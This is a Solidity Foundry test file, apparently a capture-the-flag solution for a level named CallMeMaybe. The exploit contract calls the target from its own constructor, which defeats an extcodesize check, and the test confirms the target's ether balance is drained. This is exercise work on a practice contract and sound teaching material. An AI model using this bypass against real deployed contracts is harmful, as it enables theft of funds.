// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/05_CallMeMaybe/CallMeMaybe.sol";

contract ExploitCallMeMaybe {
    constructor(CallMeMaybe callMe) {
        // Call the hereIsMyNumber() from this contract's constructor.
        // At the time of calling, extcodesize(this) will be 0, since the contract is not fully deployed yet.
        // And tx.origin != msg.sender, because code was called from contract and not from user
        
        callMe.hereIsMyNumber();
    }
}

// forge test --match-contract CallMeMaybeTest -vvvv
contract CallMeMaybeTest is BaseTest {
    CallMeMaybe instance;

    function setUp() public override {
        super.setUp();
        payable(user1).transfer(0.01 ether);
        instance = new CallMeMaybe{value: 0.01 ether}();
    }

    function testExploitLevel() public {
        ExploitCallMeMaybe exploit = new ExploitCallMeMaybe(instance);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
